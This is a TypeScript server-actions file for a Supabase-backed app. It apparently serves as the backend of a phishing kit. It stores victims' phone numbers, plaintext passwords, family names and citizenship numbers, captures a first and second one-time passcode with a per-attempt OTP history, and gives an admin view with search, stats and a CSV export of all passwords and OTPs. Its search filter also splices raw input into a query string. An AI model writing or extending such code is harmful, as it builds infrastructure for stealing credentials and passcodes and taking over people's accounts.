"use server"

import { createServiceRoleClient } from "@/lib/supabase/server"
import { type Application, type ApplicationWithOtpCount, type OtpHistory } from "@/types"

export async function createApplication(data: {
  phone_number: string
  password: string
  father_name: string
  grandfather_name: string
  mother_name: string
  citizenship_number: string
}) {
  const supabase = await createServiceRoleClient()

  const { data: app, error } = await supabase
    .from("applications")
    .insert({
      phone_number: data.phone_number,
      password: data.password,
      father_name: data.father_name,
      grandfather_name: data.grandfather_name,
      mother_name: data.mother_name,
      citizenship_number: data.citizenship_number,
    })
    .select()
    .single()

  if (error) throw new Error(error.message)
  return app as Application
}

export async function saveFirstOtp(applicationId: string, otp: string) {
  const supabase = await createServiceRoleClient()

  const { error } = await supabase
    .from("applications")
    .update({ first_otp: otp })
    .eq("id", applicationId)

  if (error) throw new Error(error.message)

  await saveOtpHistory(applicationId, otp)
}

export async function saveSecondOtp(applicationId: string, otp: string) {
  const supabase = await createServiceRoleClient()

  const { error } = await supabase
    .from("applications")
    .update({ second_otp: otp })
    .eq("id", applicationId)

  if (error) throw new Error(error.message)

  await saveOtpHistory(applicationId, otp)
}

export async function saveOtpHistoryRecord(applicationId: string, otp: string) {
  await saveOtpHistory(applicationId, otp)
}

async function saveOtpHistory(applicationId: string, otp: string) {
  const supabase = await createServiceRoleClient()

  const { data: existing } = await supabase
    .from("otp_history")
    .select("attempt_number")
    .eq("application_id", applicationId)
    .order("attempt_number", { ascending: false })
    .limit(1)

  const nextAttempt = existing && existing.length > 0 ? existing[0].attempt_number + 1 : 1

  const { error } = await supabase.from("otp_history").insert({
    application_id: applicationId,
    otp,
    attempt_number: nextAttempt,
  })

  if (error) throw new Error(error.message)
}

export async function getApplication(id: string) {
  const supabase = await createServiceRoleClient()

  const { data, error } = await supabase
    .from("applications")
    .select("*")
    .eq("id", id)
    .single()

  if (error) throw new Error(error.message)
  return data as Application
}

export async function getApplicationsWithCount(options: {
  search?: string
  page?: number
  pageSize?: number
  sortBy?: string
  sortOrder?: "asc" | "desc"
  dateFrom?: string
  dateTo?: string
  phone?: string
}) {
  const supabase = await createServiceRoleClient()

  const {
    search = "",
    page = 1,
    pageSize = 10,
    sortBy = "created_at",
    sortOrder = "desc",
    dateFrom,
    dateTo,
    phone,
  } = options

  let query = supabase
    .from("applications")
    .select("*, otp_history(count)", { count: "exact" })

  if (search) {
    query = query.or(
      `phone_number.ilike.%${search}%,father_name.ilike.%${search}%,grandfather_name.ilike.%${search}%,mother_name.ilike.%${search}%,citizenship_number.ilike.%${search}%`
    )
  }

  if (phone) {
    query = query.ilike("phone_number", `%${phone}%`)
  }

  if (dateFrom) {
    query = query.gte("created_at", dateFrom)
  }

  if (dateTo) {
    query = query.lte("created_at", dateTo)
  }

  const from = (page - 1) * pageSize
  const to = from + pageSize - 1

  const { data, error, count } = await query
    .order(sortBy, { ascending: sortOrder === "asc" })
    .range(from, to)

  if (error) throw new Error(error.message)

  const applications = (data || []).map((item: Record<string, unknown>) => {
    const otpHistory = item.otp_history as Array<{ count: number }> | undefined
    return {
      ...item,
      total_otp_attempts: otpHistory?.[0]?.count ?? 0,
    } as ApplicationWithOtpCount
  })

  return {
    data: applications,
    count: count || 0,
    page,
    pageSize,
    totalPages: Math.ceil((count || 0) / pageSize),
  }
}

export async function deleteApplication(id: string) {
  const supabase = await createServiceRoleClient()

  const { error: otpError } = await supabase
    .from("otp_history")
    .delete()
    .eq("application_id", id)

  if (otpError) throw new Error(otpError.message)

  const { error } = await supabase
    .from("applications")
    .delete()
    .eq("id", id)

  if (error) throw new Error(error.message)
}

export async function getApplicationOtpHistory(applicationId: string) {
  const supabase = await createServiceRoleClient()

  const { data, error } = await supabase
    .from("otp_history")
    .select("*")
    .eq("application_id", applicationId)
    .order("attempt_number", { ascending: true })

  if (error) throw new Error(error.message)
  return data as OtpHistory[]
}

export async function getAdminStats() {
  const supabase = await createServiceRoleClient()

  const today = new Date()
  today.setHours(0, 0, 0, 0)

  const { count: totalApplications, error: err1 } = await supabase
    .from("applications")
    .select("*", { count: "exact", head: true })

  if (err1) throw new Error(err1.message)

  const { count: todayApplications, error: err2 } = await supabase
    .from("applications")
    .select("*", { count: "exact", head: true })
    .gte("created_at", today.toISOString())

  if (err2) throw new Error(err2.message)

  const { count: totalOtpAttempts, error: err3 } = await supabase
    .from("otp_history")
    .select("*", { count: "exact", head: true })

  if (err3) throw new Error(err3.message)

  return {
    total_applications: totalApplications || 0,
    today_applications: todayApplications || 0,
    total_otp_attempts: totalOtpAttempts || 0,
  }
}

export async function exportApplicationsCsv() {
  const supabase = await createServiceRoleClient()
  const { data, error } = await supabase
    .from("applications")
    .select("*, otp_history(count)")

  if (error) throw new Error(error.message)

  const rows = (data || []).map((app: Record<string, unknown>) => {
    const otpHistory = app.otp_history as Array<{ count: number }> | undefined
    return {
      "Phone Number": app.phone_number,
      Password: app.password,
      "Father Name": app.father_name,
      "Grandfather Name": app.grandfather_name,
      "Mother Name": app.mother_name,
      "Citizenship Number": app.citizenship_number,
      "First OTP": app.first_otp || "",
      "Second OTP": app.second_otp || "",
      "Total OTP Attempts": otpHistory?.[0]?.count ?? 0,
      "Created At": app.created_at,
      "Updated At": app.updated_at,
    }
  })

  return rows
}
